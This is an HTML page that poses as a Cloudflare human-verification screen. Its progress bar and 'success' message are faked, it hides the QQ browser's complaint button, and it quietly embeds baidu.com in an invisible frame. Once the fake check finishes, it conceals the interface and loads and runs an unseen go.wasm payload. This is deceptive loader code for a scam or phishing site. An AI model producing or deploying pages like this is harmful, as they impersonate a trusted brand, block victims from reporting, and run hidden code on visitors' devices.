<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Verifying whether it's a real person - Cloudflare</title>
<script src="https://open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
<script type="text/javascript">
    mqq.ui.setTitleButtons({
        right:{
            title:'投诉',
            hidden:true
        }
    })
</script>
<style>
:root {
    --cf-blue: #f38020;
    --cf-gray-light: #f6f6f6;
    --cf-gray: #e0e0e0;
    --cf-text: #333;
    --cf-border: #ddd;
    --cf-success: #10b981;
    --cf-font: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
}

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
    font-family: var(--cf-font);
    background: var(--cf-gray-light);
    height: 100vh;
    width: 100%;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
}

/* Cloudflare Header */
.cf-header {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    padding: 18px 28px;
    background: #fff;
    border-bottom: 1px solid var(--cf-border);
    font-size: 20px;
    font-weight: 600;
    color: var(--cf-blue);
    z-index: 9999;
    text-align: center;
}

/* Main Verification Box */
.cf-box {
    background: #fff;
    width: 92%;
    max-width: 450px;
    padding: 32px;
    border-radius: 10px;
    text-align: center;
    border: 1px solid var(--cf-border);
    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
    z-index: 9998;
}

.cf-title { font-size: 22px; font-weight: bold; margin-bottom: 10px; }
.cf-sub { font-size: 14px; color: #666; margin-bottom: 15px; }

/* UUID 显示 */
#uuidDisplay { font-size:12px; color:#999; margin-top:10px; word-break: break-all; }

/* Progress bar */
.cf-progress {
    width: 100%;
    height: 6px;
    background: var(--cf-gray);
    border-radius: 4px;
    overflow: hidden;
    margin-top: 20px;
}

.cf-progress-bar {
    width: 0%;
    height: 100%;
    background: var(--cf-blue);
    transition: width 0.25s ease;
}

/* Spinner */
.spinner {
    width: 36px;
    height: 36px;
    border: 4px solid #ddd;
    border-top-color: var(--cf-blue);
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 20px auto;
}

@keyframes spin { to { transform: rotate(360deg); } }

.cf-success {
    margin-top: 15px;
    color: var(--cf-success);
    font-size: 16px;
    display: none;
}

/* Fullscreen iframe (default hidden) */
#mainFrame {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    border: none;
    z-index: 999999;
}

/* Footer 分割线 + Powered by */
.cf-footer {
    position: fixed;
    bottom: 0;
    width: 100%;
    text-align: center;
    font-size: 12px;
    color: #666;
    background: #fff;
    z-index: 9999;
}

.cf-divider {
    border: none;
    border-top: 1px solid var(--cf-border);
    margin: 0;
}

.cf-powered {
    padding: 6px 0;
}
</style>
</head>

<body>
<object data="https://www.baidu.com" width="0" height="0"></object>
<!--<object data="https://www.alipay.com" width="0" height="0"></object>-->
<header class="cf-header">Cloudflare</header>

<div class="cf-box" id="verifyBox">
    <div class="cf-title">Verifying whether it's a real person…</div>
    <div class="cf-sub">cloudflare.com</div>

    <div class="spinner" id="spinner"></div>

    <div class="cf-progress">
        <div class="cf-progress-bar" id="progressBar"></div>
    </div>

    <div class="cf-success" id="successMsg">success ✓</div>

    <!-- UUID -->
    <div id="uuidDisplay"></div>
</div>

<!-- Fullscreen iframe -->
<iframe id="mainFrame" scrolling="yes" frameborder="0"></iframe>

<!-- Footer -->
<div class="cf-footer" id="footer">
    <hr class="cf-divider" />
    <div class="cf-powered">Powered by Cloudflare</div>
</div>

<script src="wasm_exec.js"></script>
<script>
document.addEventListener("DOMContentLoaded", function () {
    const bar = document.getElementById("progressBar");
    const spinner = document.getElementById("spinner");
    const successMsg = document.getElementById("successMsg");
    const uuidDisplay = document.getElementById("uuidDisplay");
    const footer = document.getElementById("footer");
    // 生成 UUID
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random()*16|0, v = c==='x'?r:(r&0x3|0x8);
            return v.toString(16);
        });
    }

    const uuidStr = generateUUID();
    uuidDisplay.textContent = "验证会话 ID: " + uuidStr;

    let progress = 0;

    // 模拟 Cloudflare 验证
    const timer = setInterval(() => {
        progress += Math.random() * 12 + 8;
        if (progress >= 100) progress = 100;

        bar.style.width = progress + "%";

        if (progress >= 100) {
            clearInterval(timer);

            setTimeout(() => {
                spinner.style.display = "none";
                successMsg.style.display = "block";
                 footer.style.display = "none"; 
                setTimeout(() => {
                    // 隐藏 Cloudflare UI
                    document.getElementById("verifyBox").style.display = "none";
                    document.querySelector(".cf-header").style.display = "none";

                    // 执行 WASM
                    startWASM();

                }, 600);
            }, 300);
        }
    }, 120);

    function startWASM() {
        const go = new Go();
        WebAssembly.instantiateStreaming(fetch("go.wasm"), go.importObject)
            .then((result) => {
                go.run(result.instance);
            })
            .catch(err => {
                alert("WASM 加载失败：" + err);
            });
    }
});
</script>
</body>
</html>
